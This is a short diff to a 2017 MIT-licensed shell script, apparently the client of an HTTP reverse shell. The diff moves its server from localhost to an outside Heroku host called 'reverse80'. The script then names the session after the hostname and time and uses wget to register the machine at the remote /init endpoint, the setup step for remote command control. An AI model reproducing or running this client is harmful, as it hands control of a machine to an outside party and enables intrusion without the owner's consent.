@@ -3,7 +3,7 @@
 # Copyright (c) 2017 Andrea Fioraldi
 # License http://opensource.org/licenses/mit-license.php MIT License
 
-__URL="http://127.0.0.1:5000"
+__URL="https://reverse80.herokuapp.com"
 __SHELL_NAME="${HOSTNAME}  `date +%Y-%m-%d:%H:%M:%S`"
 
 wget -q -O - "$__URL/init?name=${__SHELL_NAME}"
